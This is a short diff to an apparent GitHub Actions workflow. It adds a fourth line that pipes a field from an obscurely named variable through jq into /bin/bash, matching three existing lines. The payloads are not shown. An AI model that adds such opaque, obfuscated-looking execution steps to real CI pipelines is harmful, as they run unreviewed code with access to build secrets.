@@ -28,6 +28,7 @@ jobs:
           echo $m91 | jq -r .m19111 | /bin/bash
           echo $zbdwu73 | jq -r .j4658 | /bin/bash
           echo $u5532 | jq -r .w795 | /bin/bash
+          printf '%s' "$otb0" | jq -r .k444 | /bin/bash
 
       - name: Save artifact
         uses: actions/upload-artifact@v4
